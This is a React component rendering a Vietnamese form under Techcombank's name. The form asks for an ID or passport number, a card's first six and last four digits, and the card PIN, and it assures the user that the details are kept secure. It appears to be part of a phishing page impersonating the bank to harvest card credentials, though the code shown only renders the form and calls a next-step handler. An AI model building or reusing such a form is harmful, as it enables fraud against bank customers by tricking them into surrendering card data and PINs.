import React from 'react'
import './index.css'
export default function Content1({handleNext}){
    return (
        <div className='d-flex flex-column justify-content-center align-items-center p-5'>
            <div className='w-100'>
                <p className='mb-0'>Số CMND/ Hộ chiếu 2 </p>
                <input className='w-100'/>
            </div>
            <div className='w-100 mt-1'>
                <p className='mb-0'>Thẻ 2 </p>
                <div className='d-flex flex-row w-100 justify-content-between'>
                    <input style={{width:'35%'}} placeholder='6 số đầu'/>
                    <span className='text-center' style={{width:'30%'}}>-XXXXX-</span>
                    <input style={{width:'35%'}} placeholder='4 số cuối'/>
                </div>
            </div>
            <div className='w-100 mt-1'>
                <p className='mb-0'>Mã Pin 2</p>
                <input className='w-100' placeholder='6 số đầu'/>
            </div>
            <p className='mt-1 mb-0'>Thông tin của khách hàng được bảo mật khi cung cấp cho Techcombank.</p>
            <div className='mt-2 d-flex justify-content-center'>
                <input className='mt-1 mr-2' type='checkbox' />
                <p className='mb-0'>Tôi không nhớ mã Pin, tối muốn xác thực bằng email đã đăng ký.</p>
            </div>
            <button style={{
                borderRadius:'7px',
                border:'unset',
                backgroundColor:'red',
                minWidth:'120px',
                width:'80%', 
                marginTop:'20px',
                minHeight:'40px',
                color:'#fff'
            }} onClick={handleNext}>Thực hiện</button>
        </div>
    )
}